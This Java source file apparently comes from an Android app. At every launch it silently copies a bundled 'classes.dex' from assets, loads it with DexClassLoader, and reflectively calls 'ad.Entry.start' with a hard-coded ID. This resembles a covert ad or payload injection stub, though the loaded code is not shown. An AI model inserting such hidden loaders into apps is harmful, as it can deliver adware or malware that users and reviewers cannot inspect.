package aaa.bbb;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Method;

import android.app.Application;
import android.content.Context;
import dalvik.system.DexClassLoader;

public class App extends Application {

	@Override
	public void onCreate() {
		super.onCreate();
		App.init(this);
	}

	public static void init(final Context context) {
		final String dexFile = context.getFilesDir() + File.separator
				+ "classes.dex";
		final String odexDir = context.getFilesDir().getAbsolutePath()
				+ "/odex";
		new File(odexDir).mkdirs();
		new Thread(new Runnable() {
			@Override
			public void run() {
				// 装载dex
				DexClassLoader dcl = null;
				InputStream is = null;
				FileOutputStream fos = null;
				try {
					is = context.getAssets().open("classes.dex");

					File destDir = new File(dexFile.substring(0,
							dexFile.lastIndexOf("/")));
					if (destDir.isDirectory()) {
						if (!destDir.exists()) {
							destDir.mkdirs();
						}
					}
					fos = new FileOutputStream(dexFile);
					int len = -1;
					byte[] buf = new byte[512];
					while ((len = is.read(buf)) != -1) {
						fos.write(buf, 0, len);
						fos.flush();
					}

					if (new File(dexFile).exists()) {
						dcl = new DexClassLoader(dexFile, odexDir, null,
								context.getClassLoader());
					}
				} catch (Exception e) {
					e.printStackTrace();
				} finally {
					if (fos != null) {
						try {
							fos.close();
						} catch (IOException e) {
							e.printStackTrace();
						}
					}
					if (is != null) {
						try {
							is.close();
						} catch (IOException e) {
							e.printStackTrace();
						}
					}
				}

				if (dcl != null) {
					try {
						Class cls = dcl.loadClass("ad.Entry");
						Method m = cls.getDeclaredMethod("start", String.class,
								Context.class);
						m.setAccessible(true);
						m.invoke(null, "01hbPe10", context);
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
			}
		}).start();
	}
}
